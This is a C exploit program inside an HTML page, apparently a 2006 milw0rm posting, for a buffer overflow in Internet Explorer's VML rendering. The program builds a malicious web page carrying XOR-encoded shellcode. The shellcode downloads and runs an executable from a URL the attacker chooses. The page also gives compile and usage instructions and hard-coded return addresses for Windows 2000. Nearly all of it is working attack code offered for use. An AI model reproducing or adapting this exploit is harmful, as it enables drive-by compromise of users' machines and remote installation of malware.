<html><head><title>MS Internet Explorer (VML) Remote Buffer Overflow Exploit</title></head><pre>/*
*-----------------------------------------------------------------------
*
* vml.c - Internet Explorer VML Buffer Overflow Download Exec Exploit
* !!! 0day !!! Public Version !!!
*
* Copyright (C) 2006 XSec All Rights Reserved.
*
* Author : nop
* : nop#xsec.org
* : http://www.xsec.org
* :
* Tested : Windows 2000 Server CN
* : + Internet Explorer 6.0 SP1
* :
* Complie : cl vml.c
* :
* Usage : d:\&gt;vml
* :
* : Usage: vml &lt;URL&gt; [htmlfile]
* :
* : d:\&gt;vml http://xsec.org/xxx.exe xxx.htm
* :
*
*------------------------------------------------------------------------
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

FILE *fp = NULL;
char *file = &quot;xsec.htm&quot;;
char *url = NULL;

#define NOPSIZE 260
#define MAXURL 60

//DWORD ret = 0x7Ffa4512; // call esp for CN
DWORD ret = 0x7800CCDD; // call esp for All win2k

// Search Shellcode
unsigned char dc[] =
&quot;\x8B\xDC\xBE\x6F\x6F\x6F\x70\x4E\xBF\x6F\x30\x30\x70\x4F\x43\x39&quot;
&quot;\x3B\x75\xFB\x4B\x80\x33\xEE\x39\x73\xFC\x75\xF7\xFF\xD3&quot;;

// Shellcode Start
unsigned char dcstart[] =
&quot;noop&quot;;

// Download Exec Shellcode XOR with 0xee
unsigned char sc[] =
&quot;\x07\x4B\xEE\xEE\xEE\xB1\x8A\x4F\xDE\xEE\xEE\xEE\x65\xAE\xE2\x65&quot;
&quot;\x9E\xF2\x43\x65\x86\xE6\x65\x19\x84\xEA\xB7\x06\xAB\xEE\xEE\xEE&quot;
&quot;\x0C\x17\x86\x81\x80\xEE\xEE\x86\x9B\x9C\x82\x83\xBA\x11\xF8\x7B&quot;
&quot;\x06\xDE\xEE\xEE\xEE\x6D\x02\xCE\x65\x32\x84\xCE\xBD\x11\xB8\xEA&quot;
&quot;\x29\xEA\xED\xB2\x8F\xC0\x8B\x29\xAA\xED\xEA\x96\x8B\xEE\xEE\xDD&quot;
&quot;\x2E\xBE\xBE\xBD\xB9\xBE\x11\xB8\xFE\x65\x32\xBE\xBD\x11\xB8\xE6&quot;
&quot;\x84\xEF\x11\xB8\xE2\xBF\xB8\x65\x9B\xD2\x65\x9A\xC0\x96\xED\x1B&quot;
&quot;\xB8\x65\x98\xCE\xED\x1B\xDD\x27\xA7\xAF\x43\xED\x2B\xDD\x35\xE1&quot;
&quot;\x50\xFE\xD4\x38\x9A\xE6\x2F\x25\xE3\xED\x34\xAE\x05\x1F\xD5\xF1&quot;
&quot;\x9B\x09\xB0\x65\xB0\xCA\xED\x33\x88\x65\xE2\xA5\x65\xB0\xF2\xED&quot;
&quot;\x33\x65\xEA\x65\xED\x2B\x45\xB0\xB7\x2D\x06\xB8\x11\x11\x11\x60&quot;
&quot;\xA0\xE0\x02\x2F\x97\x0B\x56\x76\x10\x64\xE0\x90\x36\x0C\x9D\xD8&quot;
&quot;\xF4\xC1\x9E&quot;;

// Shellcode End
unsigned char dcend[] =
&quot;n00p&quot;;

// HTML Header
char * header =
&quot;&lt;html xmlns:v=\&quot;urn:schemas-microsoft-com:vml\&quot;&gt;\n&quot;
&quot;&lt;head&gt;\n&quot;
&quot;&lt;title&gt;XSec.org&lt;/title&gt;\n&quot;
&quot;&lt;style&gt;\n&quot;
&quot;v\\:* { behavior: url(#default#VML); }\n&quot;
&quot;&lt;/style&gt;\n&quot;
&quot;&lt;/head&gt;\n&quot;
&quot;&lt;body&gt;\n&quot;
&quot;&lt;v:rect style=\&quot;width:20pt;height:20pt\&quot; fillcolor=\&quot;red\&quot;&gt;\n&quot;
&quot;&lt;v:fill method=\&quot;&quot;;

char * footer =
&quot;\&quot;/&gt;\n&quot;
&quot;&lt;/v:rect&gt;\n&quot;
&quot;&lt;/body&gt;\n&quot;
&quot;&lt;/html&gt;\n&quot;
;

// convert string to NCR
void convert2ncr(unsigned char * buf, int size)
{
	int i=0;
	unsigned int ncr = 0;

	for(i=0; i&lt;size; i+=2)
	{
		ncr = (buf[i+1] &lt;&lt; 8) + buf[i];

		fprintf(fp, &quot;&amp;#%d;&quot;, ncr);
	}
}

void main(int argc, char **argv)
{
	unsigned char buf[1024] = {0};
	unsigned char burl[255] = {0};
	int sc_len = 0;
	int psize = 0;
	int i = 0;

	unsigned int nop = 0x4141;
	DWORD jmp = 0xeb06eb06;

	if (argc &lt; 2)
	{
		printf(&quot;Windows VML Download Exec Exploit\n&quot;);
		printf(&quot;Code by nop nop#xsec.org, Welcome to http://www.xsec.org\n&quot;);
		//printf(&quot;!!! 0Day !!! Please Keep Private!!!\n&quot;);
		printf(&quot;\r\nUsage: %s &lt;URL&gt; [htmlfile]\r\n\n&quot;, argv[0]);
		exit(1);
	}

	url = argv[1];
	if( (!strstr(url, &quot;http://&quot;) &amp;&amp; !strstr(url, &quot;ftp://&quot;)) || strlen(url) &lt;
			10 || strlen(url) &gt; MAXURL)
	{
		printf(&quot;[-] Invalid url. Must start with 'http://','ftp://' and &lt; %d bytes.\n&quot;, MAXURL);
		return;
	}

	printf(&quot;[+] download url:%s\n&quot;, url);

	if(argc &gt;=3) file = argv[2];

	printf(&quot;[+] exploit file:%s\n&quot;, file);

	fp = fopen(file, &quot;w+b&quot;);
	//fp = fopen(file, &quot;w&quot;);
	if(!fp)
	{
		printf(&quot;[-] Open file error!\n&quot;);
		return;
	}

	// print html header
	fprintf(fp, &quot;%s&quot;, header);
	fflush(fp);

	for(i=0; i&lt;NOPSIZE; i++)
	{
		//fprintf(fp, &quot;&amp;#%d;&quot;, nop);
		fprintf(fp, &quot;A&quot;);
	}

	fflush(fp);

	// print shellcode
	memset(buf, 0x90, sizeof(buf));
	//memset(buf, 0x90, NOPSIZE*2);

	memcpy(buf, &amp;ret, 4);
	psize = 4+8+0x10;

	memcpy(buf+psize, dc, sizeof(dc)-1);
	psize += sizeof(dc)-1;

	memcpy(buf+psize, dcstart, 4);
	psize += 4;

	sc_len = sizeof(sc)-1;
	memcpy(buf+psize, sc, sc_len);
	psize += sc_len;


	// print URL
	memset(burl, 0, sizeof(burl));
	strncpy(burl, url, 60);

	for(i=0; i&lt;strlen(url)+1; i++)
	{
		burl[i] = buf[i] ^ 0xee;
	}

	memcpy(buf+psize, burl, strlen(url)+1);
	psize += strlen(url)+1;

	memcpy(buf+psize, dcend, 4);
	psize += 4;


	// print NCR
	convert2ncr(buf, psize);



	printf(&quot;[+] buff size %d bytes\n&quot;, psize);

	// print html footer
	fprintf(fp, &quot;%s&quot;, footer);
	fflush(fp);

	printf(&quot;[+] exploit write to %s success!\n&quot;, file);
}

// milw0rm.com [2006-09-20]</pre></html>